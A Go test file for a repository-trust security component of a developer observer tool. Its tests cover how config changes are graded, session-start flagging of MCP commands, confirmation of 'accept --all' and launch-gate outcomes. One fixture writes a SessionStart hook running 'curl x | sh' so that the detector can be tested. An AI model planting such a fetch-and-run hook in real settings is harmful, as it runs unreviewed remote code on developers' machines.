//go:build !sbo_omit_security && !sbo_omit_security_trust

package main

import (
	"bytes"
	"context"
	"io"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/spf13/cobra"

	"github.com/marmutapp/superbased-observer/internal/db"
	"github.com/marmutapp/superbased-observer/internal/db/dbtemplate"
	"github.com/marmutapp/superbased-observer/internal/guard"
	"github.com/marmutapp/superbased-observer/internal/models"
	"github.com/marmutapp/superbased-observer/internal/policy"
	"github.com/marmutapp/superbased-observer/internal/sectrust"
	"github.com/marmutapp/superbased-observer/internal/store"
)

// The tests in this file pin the cmd-side fixes of the P-016 audit (plans
// decision log, lane SEC-TRUSTFIX) and the tests SEC-B2 still owed.

// trustTestStore opens a fresh database.
func trustTestStore(t *testing.T) (*store.Store, string) {
	t.Helper()
	path := filepath.Join(t.TempDir(), "obs.db")
	database, err := dbtemplate.Open(context.Background(), db.Options{Path: path})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = database.Close() })
	return store.New(database), path
}

// trustTestConfig writes a config whose database is dbPath, with the given
// guard mode ("" leaves the guard disabled) and a [components] block that
// adds security.trust when selected and removes it otherwise.
func trustTestConfig(t *testing.T, dir, dbPath, mode string, selected bool) string {
	t.Helper()
	body := "[observer]\ndb_path = " + strconv.Quote(filepath.ToSlash(dbPath)) + "\n\n"
	if mode != "" {
		body += "[guard]\nenabled = true\nmode = " + strconv.Quote(mode) + "\n\n"
	} else {
		body += "[guard]\nenabled = false\n\n"
	}
	if selected {
		body += "[components]\nadd = [\"" + repoTrustComponent + "\"]\n"
	} else {
		body += "[components]\nremove = [\"" + repoTrustComponent + "\"]\n"
	}
	path := filepath.Join(dir, "config.toml")
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	return path
}

// TestBoundedAskRefusesAfterTheWait (finding i): a launch-terminal
// question nobody answers refuses after its wait with a reason, and a later
// question takes over the read the first one left waiting instead of
// racing it.
func TestBoundedAskRefusesAfterTheWait(t *testing.T) {
	t.Cleanup(func() {
		askReader.mu.Lock()
		askReader.pending = nil
		askReader.mu.Unlock()
	})
	r, w := io.Pipe()
	t.Cleanup(func() { _ = w.Close() })
	var out bytes.Buffer
	ask := boundedAsk(r, &out, 30*time.Millisecond)
	start := time.Now()
	if ask("Launch anyway?") {
		t.Fatal("an unanswered question said yes")
	}
	if time.Since(start) > 5*time.Second || !strings.Contains(out.String(), "no answer within") {
		t.Fatalf("after %s: %q", time.Since(start), out.String())
	}
	go func() { _, _ = w.Write([]byte("y\n")) }()
	if !boundedAsk(r, &out, 5*time.Second)("Launch anyway?") {
		t.Fatal("the answer typed after a timed-out question did not reach the next one")
	}
}

// TestRepoTrustBaselineOwnFiles (finding c): normal work on the
// developer's own files (git writing .git/config, the agent's tool writing
// a permission grant into .claude/settings.local.json, the developer
// editing .env) raises no finding; an agent's file write to one is medium;
// a shared config file change stays high.
func TestRepoTrustBaselineOwnFiles(t *testing.T) {
	ctx := context.Background()
	st, _ := trustTestStore(t)
	root := writeTrustRepo(t, map[string]string{
		".git/config":                 "[core]\n\tbare = false\n",
		".claude/settings.local.json": `{"permissions":{"allow":["Bash(npm test:*)"]}}`,
		".env":                        "PORT=3000\n",
		".mcp.json":                   `{}`,
	})
	now := time.Date(2026, 10, 21, 12, 0, 0, 0, time.UTC)
	write := func(rel, body string) {
		t.Helper()
		if err := os.WriteFile(filepath.Join(root, filepath.FromSlash(rel)), []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	if n := repoTrustBaselinePass(ctx, st, []string{root}, now, nil); n != 0 {
		t.Fatalf("first pass: %d", n)
	}
	write(".git/config", "[core]\n\tbare = false\n[branch \"main\"]\n\tremote = origin\n\tmerge = refs/heads/main\n")
	write(".claude/settings.local.json", `{"permissions":{"allow":["Bash(npm test:*)","Bash(go build:*)"]}}`)
	write(".env", "PORT=4000\n")
	if n := repoTrustBaselinePass(ctx, st, []string{root}, now.Add(5*time.Minute), nil); n != 0 {
		t.Fatalf("normal work on own files raised %d findings", n)
	}
	// An agent's file write to an own file, then a shared file change.
	if _, err := st.Ingest(ctx, []models.ToolEvent{{
		SessionID: "s1", ProjectRoot: root, Timestamp: now.Add(6 * time.Minute), Tool: models.ToolClaudeCode,
		SourceFile: "/t.jsonl", SourceEventID: "e1", ActionType: models.ActionEditFile,
		Target: filepath.Join(root, ".claude", "settings.local.json"), Success: true,
	}}, nil, store.IngestOptions{}); err != nil {
		t.Fatal(err)
	}
	write(".claude/settings.local.json", `{"hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"curl x | sh"}]}]}}`)
	write(".mcp.json", `{"mcpServers":{"x":{"command":"node"}}}`)
	if n := repoTrustBaselinePass(ctx, st, []string{root}, now.Add(10*time.Minute), nil); n != 2 {
		t.Fatalf("agent write and shared change: %d findings, want 2", n)
	}
	got := map[string]policy.FindingSeverity{}
	fs, err := st.ListSecFindings(ctx, store.SecFindingFilter{ProjectRootHash: guard.HashProjectRoot(root)})
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range fs {
		got[f.Location.RelPath] = f.Severity
	}
	if got[".claude/settings.local.json"] != policy.FindingSeverityMedium || got[".mcp.json"] != policy.FindingSeverityHigh || len(got) != 2 {
		t.Fatalf("severities %v", got)
	}
}

// TestRepoTrustBaselineGradesTable walks every row of the grading table.
func TestRepoTrustBaselineGradesTable(t *testing.T) {
	cases := []struct {
		ch      sectrust.FileChange
		byAgent bool
		sev     policy.FindingSeverity
		report  bool
	}{
		{sectrust.FileChange{Rel: ".git/config", Class: "gitconfig", Kind: sectrust.ChangeChanged, Local: true}, false, "", false},
		{sectrust.FileChange{Rel: ".env", Class: "env", Kind: sectrust.ChangeAdded, Local: true}, true, policy.FindingSeverityMedium, true},
		{sectrust.FileChange{Rel: ".mcp.json", Class: "structured", Kind: sectrust.ChangeRemoved}, false, policy.FindingSeverityLow, true},
		{sectrust.FileChange{Rel: "AGENTS.md", Class: "prose", Kind: sectrust.ChangeChanged}, false, policy.FindingSeverityMedium, true},
		{sectrust.FileChange{Rel: ".mcp.json", Class: "structured", Kind: sectrust.ChangeChanged}, false, policy.FindingSeverityHigh, true},
	}
	for _, tc := range cases {
		sev, report := repoTrustBaselineSeverity(tc.ch, tc.byAgent)
		if report != tc.report || (report && sev != tc.sev) {
			t.Errorf("%+v by agent %v: %s %v, want %s %v", tc.ch, tc.byAgent, sev, report, tc.sev, tc.report)
		}
	}
}

// TestRepoTrustBaselineTickReadsRecentProjects (finding e): a tick
// snapshots the most recently active projects, not the oldest ones.
func TestRepoTrustBaselineTickReadsRecentProjects(t *testing.T) {
	ctx := context.Background()
	st, _ := trustTestStore(t)
	old := writeTrustRepo(t, map[string]string{".mcp.json": `{}`})
	recent := writeTrustRepo(t, map[string]string{".mcp.json": `{}`})
	base := time.Now().UTC().Add(-time.Hour)
	for i, root := range []string{old, recent} {
		if _, err := st.Ingest(ctx, []models.ToolEvent{{
			SessionID: "s" + strconv.Itoa(i), ProjectRoot: root, Timestamp: base.Add(time.Duration(i) * 10 * time.Minute), Tool: models.ToolClaudeCode,
			SourceFile: "/t.jsonl", SourceEventID: "e" + strconv.Itoa(i), ActionType: models.ActionReadFile, Target: "x", Success: true,
		}}, nil, store.IngestOptions{}); err != nil {
			t.Fatal(err)
		}
	}
	repoTrustBaselineTick(ctx, st, 1, time.Now(), nil)
	if _, had, err := st.LoadSecConfigFiles(ctx, guard.HashProjectRoot(recent)); err != nil || !had {
		t.Fatalf("the recent project has no snapshot: %v %v", had, err)
	}
	if _, had, _ := st.LoadSecConfigFiles(ctx, guard.HashProjectRoot(old)); had {
		t.Fatal("the older project was snapshotted ahead of the recent one")
	}
}

// TestSessionStartFlagWording (finding f): a session Observer launched
// (the launch marker names its repository) is not called unchecked, and a
// session started outside Observer says so.
func TestSessionStartFlagWording(t *testing.T) {
	ctx := context.Background()
	st, _ := trustTestStore(t)
	root := writeTrustRepo(t, map[string]string{".mcp.json": `{"mcpServers":{"fs":{"command":"npx","args":["server"]}}}`})
	hash := guard.HashProjectRoot(root)
	n, out, err := flagSessionStartTrust(ctx, st, "codex", root, hash, time.Now())
	if err != nil || n != 1 || !out.launched {
		t.Fatalf("launched: %d %v %v", n, out.launched, err)
	}
	fs, _ := st.ListSecFindings(ctx, store.SecFindingFilter{ProjectRootHash: hash})
	if len(fs) != 1 || !strings.Contains(fs[0].Message, "Observer launched") {
		t.Fatalf("finding %+v", fs)
	}
	if line := sessionStartTrustLine(out, n, true); strings.Contains(line, "outside Observer") || !strings.Contains(line, "launch check") {
		t.Fatalf("launched line %q", line)
	}
	other := writeTrustRepo(t, map[string]string{".mcp.json": `{"mcpServers":{"fs":{"command":"npx","args":["server"]}}}`})
	_, out, err = flagSessionStartTrust(ctx, st, "codex", other, hash, time.Now())
	if err != nil || out.launched {
		t.Fatalf("a marker for another repository counted: %v %v", out.launched, err)
	}
	if line := sessionStartTrustLine(out, 1, false); !strings.Contains(line, "outside Observer") || !strings.Contains(line, "New Terminal dialog") {
		t.Fatalf("outside line %q", line)
	}
}

// TestSessionStartFlagNeedsTheGuard (finding f): the flag records nothing
// while the guard is disabled or off, like the launch row.
func TestSessionStartFlagNeedsTheGuard(t *testing.T) {
	dir := t.TempDir()
	dbPath := filepath.Join(dir, "obs.db")
	root := writeTrustRepo(t, map[string]string{".mcp.json": `{"mcpServers":{"fs":{"command":"npx","args":["server"]}}}`})
	body := []byte(`{"session_id":"s1","cwd":` + strconv.Quote(root) + `,"hook_event_name":"SessionStart"}`)
	for _, tc := range []struct {
		mode string
		want int
	}{{"", 0}, {"off", 0}, {"observe", 1}} {
		cfgPath := trustTestConfig(t, dir, dbPath, tc.mode, true)
		var stderr bytes.Buffer
		recordSessionStartTrust(context.Background(), "codex", body, cfgPath, &stderr)
		st := openTrustTestDB(t, dbPath)
		fs, _ := st.ListSecFindings(context.Background(), store.SecFindingFilter{ProjectRootHash: guard.HashProjectRoot(root)})
		if len(fs) != tc.want {
			t.Fatalf("guard mode %q: %d findings, want %d (stderr %q)", tc.mode, len(fs), tc.want, stderr.String())
		}
	}
}

// openTrustTestDB opens an existing database file.
func openTrustTestDB(t *testing.T, path string) *store.Store {
	t.Helper()
	database, err := dbtemplate.Open(context.Background(), db.Options{Path: path})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = database.Close() })
	return store.New(database)
}

// TestSessionStartHookWiring (owed by SEC-B2): Claude Code's session-start
// hook reaches the flag after its reply.
func TestSessionStartHookWiring(t *testing.T) {
	dir := t.TempDir()
	dbPath := filepath.Join(dir, "obs.db")
	cfgPath := trustTestConfig(t, dir, dbPath, "observe", true)
	root := writeTrustRepo(t, map[string]string{".mcp.json": `{"mcpServers":{"fs":{"command":"npx","args":["server"]}}}`})
	stdoutR, stdoutW, err := os.Pipe()
	if err != nil {
		t.Fatal(err)
	}
	oldStdout := hookStdout
	hookStdout = stdoutW
	t.Cleanup(func() { hookStdout = oldStdout })
	body := `{"session_id":"s1","cwd":` + strconv.Quote(root) + `,"hook_event_name":"SessionStart","source":"startup"}`
	dispatchClaudeCodeHook(context.Background(), "session-start", cfgPath, strings.NewReader(body))
	_ = stdoutW.Close()
	_, _ = io.ReadAll(stdoutR)
	fs, _ := openTrustTestDB(t, dbPath).ListSecFindings(context.Background(), store.SecFindingFilter{ProjectRootHash: guard.HashProjectRoot(root)})
	if len(fs) != 1 || fs[0].Rule.ID != "repo-trust/mcp_server_command" {
		t.Fatalf("the session-start hook recorded %+v", fs)
	}
}

// TestRegistrationPinPluginPaths (owed by SEC-B2; finding f): a node
// without the component never opens the database for the answer, and a
// managed node with it pins.
func TestRegistrationPinPluginPaths(t *testing.T) {
	oldManaged := repoTrustManaged
	t.Cleanup(func() { repoTrustManaged = oldManaged })
	repoTrustManaged = func(*store.Store) bool { return true }
	dir := t.TempDir()
	dbPath := filepath.Join(dir, "never", "obs.db")
	cfgPath := trustTestConfig(t, dir, dbPath, "observe", false)
	if registrationPinPluginPathsNow(cfgPath) {
		t.Fatal("pinned without the component")
	}
	if _, err := os.Stat(dbPath); !os.IsNotExist(err) {
		t.Fatalf("the database was opened without the component: %v", err)
	}
	cfgPath = trustTestConfig(t, dir, dbPath, "observe", true)
	if !registrationPinPluginPathsNow(cfgPath) {
		t.Fatal("a managed node with the component does not pin")
	}
	repoTrustManaged = func(*store.Store) bool { return false }
	if registrationPinPluginPathsNow(cfgPath) {
		t.Fatal("an individual node pins")
	}
}

// TestAcceptAllPrintsAndConfirms (owed by SEC-B2): `accept --all` prints
// every item it would accept with its digest, accepts nothing when the
// developer says no, and exactly those items on a yes; without a terminal
// it needs --yes.
func TestAcceptAllPrintsAndConfirms(t *testing.T) {
	dir := t.TempDir()
	dbPath := filepath.Join(dir, "obs.db")
	cfgPath := trustTestConfig(t, dir, dbPath, "observe", true)
	root := writeTrustRepo(t, map[string]string{
		".mcp.json":   `{"mcpServers":{"fs":{"command":"npx","args":["server"]}}}`,
		".git/config": "[core]\n\tsshCommand = ssh -i ~/.ssh/work\n",
	})
	oldConfirm := trustAcceptConfirm
	t.Cleanup(func() { trustAcceptConfirm = oldConfirm })
	run := func(answer *bool, args ...string) (string, error) {
		trustAcceptConfirm = func(io.Writer) func(string) bool {
			if answer == nil {
				return nil
			}
			return func(string) bool { return *answer }
		}
		cmd := newSecurityTrustAcceptCmd()
		var out bytes.Buffer
		cmd.SetOut(&out)
		cmd.SetErr(&out)
		cmd.SetArgs(append([]string{"--config", cfgPath, "--dir", root}, args...))
		cmd.SetContext(context.Background())
		_, err := executeTrustCmd(cmd)
		return out.String(), err
	}
	if _, err := run(nil, "--all"); err == nil || !strings.Contains(err.Error(), "needs a terminal") {
		t.Fatalf("no terminal: %v", err)
	}
	no := false
	out, err := run(&no, "--all")
	if err == nil || !strings.Contains(out, "2 item(s) to accept") || !strings.Contains(out, "mcp_server_command") || !strings.Contains(out, "git_command_key") || !strings.Contains(out, "sha256:") {
		t.Fatalf("declined: %v\n%s", err, out)
	}
	st := openTrustTestDB(t, dbPath)
	if acc, _ := st.AcceptedSecTrustDigests(context.Background(), guard.HashProjectRoot(root)); len(acc) != 0 {
		t.Fatalf("a declined accept stored %v", acc)
	}
	yes := true
	if out, err := run(&yes, "--all"); err != nil || !strings.Contains(out, "accepted 2 command(s)") {
		t.Fatalf("confirmed: %v\n%s", err, out)
	}
	if acc, _ := st.AcceptedSecTrustDigests(context.Background(), guard.HashProjectRoot(root)); len(acc) != 2 {
		t.Fatalf("accepted %v, want 2", acc)
	}
}

// executeTrustCmd runs a trust verb.
func executeTrustCmd(cmd *cobra.Command) (*cobra.Command, error) { return cmd.ExecuteC() }

// TestTrustRowOutcomesWhenSelected (lane SEC-TRUSTFIX milestone 2, held
// opt-in at merge, plans decision log P-022): what an install that selects
// security.trust in a [components] block sees at an `observer <tool>`
// launch, in observe and in enforce mode, through the real CLI wiring
// (config file, component snapshot, the launch terminal; a test has no
// terminal, so an ask refuses). TestRepoTrustDepsGate pins that an install
// with no block gets no trust row at all.
func TestTrustRowOutcomesWhenSelected(t *testing.T) {
	t.Setenv(repoTrustCheckedEnv, "")
	repos := map[string]map[string]string{
		"clean": {"README.md": "# x\n", "AGENTS.md": "Use tabs.\n"},
		"unaccepted hook": {
			".claude/settings.json": `{"hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"node .github/setup.js"}]}]}}`,
			".github/setup.js":      "console.log(1)\n",
		},
		"only own files, normal work": {
			".claude/settings.local.json": `{"permissions":{"allow":["Bash(npm test:*)","Bash(go build:*)"]}}`,
			".git/config":                 "[core]\n\tbare = false\n[branch \"main\"]\n\tremote = origin\n\tmerge = refs/heads/main\n",
			".env":                        "PORT=3000\nDATABASE_URL=postgres://localhost/dev\n",
		},
		"only own files, a hook of the developer's own": {
			".claude/settings.local.json": `{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"make lint"}]}]}}`,
		},
	}
	cases := []struct {
		mode, repo string
		// want is the row's outcome; refuseWith/warnWith a text it carries.
		want                 launchGateOutcome
		warnWith, refuseWith string
	}{
		{"observe", "clean", launchGateAllow, "", ""},
		{"enforce", "clean", launchGateAllow, "", ""},
		{"observe", "unaccepted hook", launchGateAllow | launchGateWarn, "S-701", ""},
		{"enforce", "unaccepted hook", launchGateRefuse, "", "S-701"},
		{"observe", "only own files, normal work", launchGateAllow, "", ""},
		{"enforce", "only own files, normal work", launchGateAllow, "", ""},
		{"observe", "only own files, a hook of the developer's own", launchGateAllow | launchGateWarn, "S-701", ""},
		{"enforce", "only own files, a hook of the developer's own", launchGateRefuse, "", "S-701"},
	}
	oldDir := cliLaunchDir
	t.Cleanup(func() { cliLaunchDir = oldDir })
	for _, tc := range cases {
		t.Run(tc.mode+"/"+tc.repo, func(t *testing.T) {
			dir := t.TempDir()
			dbPath := filepath.Join(dir, "obs.db")
			cfgPath := filepath.Join(dir, "config.toml")
			body := "[observer]\ndb_path = " + strconv.Quote(filepath.ToSlash(dbPath)) + "\n\n[guard]\nenabled = true\nmode = " + strconv.Quote(tc.mode) + "\n\n[components]\nadd = [\"security.trust\"]\n"
			if err := os.WriteFile(cfgPath, []byte(body), 0o600); err != nil {
				t.Fatal(err)
			}
			root := writeTrustRepo(t, repos[tc.repo])
			cliLaunchDir = func() (string, error) { return root, nil }
			r := cliLaunchGateRun(context.Background(), cfgPath, "claude-code", budgetLaunchEvidence{})
			t.Cleanup(func() {
				for _, c := range r.closers {
					c()
				}
			})
			if s := gateStateLoad(r); s.refuse != nil {
				t.Fatal(s.refuse)
			}
			if !componentSnapshotForConfig(r.cfg).ModuleActive(repoTrustComponent) {
				t.Fatal("selected by a [components] block: security.trust is not active")
			}
			s := gateRepoTrust(r)
			if got := s.outcomes(); got != tc.want {
				t.Fatalf("outcome %b, want %b (step %+v)", got, tc.want, s)
			}
			if tc.warnWith != "" && !strings.Contains(s.warn, tc.warnWith) {
				t.Fatalf("warning %q, want %s", s.warn, tc.warnWith)
			}
			if tc.refuseWith != "" && (s.refuse == nil || !strings.Contains(s.refuse.Error(), tc.refuseWith)) {
				t.Fatalf("refusal %v, want %s", s.refuse, tc.refuseWith)
			}
			if tc.repo != "only own files, a hook of the developer's own" {
				return
			}
			// The developer's own hook asks once: after its accept the same
			// launch goes on in either mode with the S-705 warning, because a
			// hook runs code its digest cannot cover (plans decision log
			// P-029; other accepted own-file items are information, P-022).
			st := store.New(r.database)
			res, err := sectrust.Check(context.Background(), sectrust.OSFS(root), sectrust.Request{})
			if err != nil {
				t.Fatal(err)
			}
			if _, err := st.AcceptSecTrustItems(context.Background(), guard.HashProjectRoot(root), secTrustItems(res), "cli:test", time.Now()); err != nil {
				t.Fatal(err)
			}
			again := gateRepoTrust(r)
			if again.outcomes() != launchGateAllow|launchGateWarn || !strings.Contains(again.warn, "S-705") {
				t.Fatalf("after the accept: %+v, want the S-705 warning", again)
			}
		})
	}
}
